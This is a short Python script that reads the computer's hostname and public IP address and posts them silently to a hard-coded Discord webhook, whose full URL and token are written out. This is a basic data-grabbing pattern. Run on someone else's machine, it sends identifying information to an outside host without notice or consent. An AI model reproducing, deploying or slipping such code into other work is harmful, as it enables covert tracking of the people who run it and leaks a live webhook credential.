import requests
import socket

webhook = "https://discord.com/api/webhooks/1226985065464991824/0UIxI8ty5vzyk1JASyJ034OiStCpRHB-olxsrwUyLwxb1PHRGGaE4rgGdJ2PzjrCjWgU"

ip = requests.get("https://api64.ipify.org/").content

data = {
    "Username": "احمد محسن اقرع",
    "content": f"PC: {socket.gethostname()}\nIP: {ip.decode()}"
}

req = requests.post(webhook, data=data)
